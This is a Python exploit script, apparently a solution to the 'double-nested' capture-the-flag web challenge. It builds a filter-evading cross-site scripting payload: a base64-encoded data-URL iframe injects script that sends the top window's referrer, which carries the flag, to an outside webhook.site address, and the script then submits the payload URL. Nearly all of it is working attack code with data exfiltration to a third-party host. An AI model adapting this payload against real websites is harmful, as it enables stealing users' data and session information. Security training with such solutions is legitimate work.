import requests
import urllib.parse
import base64

# === Setup ===
host = 'https://double-nested.tjc.tf'  # Target
webhook = "https://webhook.site/f473ce12-bfd6-41ab-b2dc-81a815a72122"
admin_bot = "https://admin-bot.tjctf.org/double-nested"

# === JS payload to extract flag ===
inject_param = f"a=1&b=2&x="
js = f"""
window['top']['locatio' + 'n'].href = `{webhook}/?from=`+window['docume'+'nt'].referrer;
"""
iframe_payload = f'<base href="https://double-nested.tjc.tf"><script src="gen?query={urllib.parse.quote(inject_param + js)}"></script>'
b64_payload = base64.b64encode(iframe_payload.encode()).decode()
payload = inject_param + "<iframe id='work' src='data:text/html;base64," + b64_payload + "' referrerpolicy='unsafe-url'></iframe>"

# === Final URL
url = f"{host}/?i={urllib.parse.quote(payload)}"

# === Send Request ===
print(f"[*] Sending XSS payload to:\n{url}\n")
response = requests.get(url)
print(f"[+] HTTP {response.status_code}")
print(f"[+] Response length: {len(response.text)}")
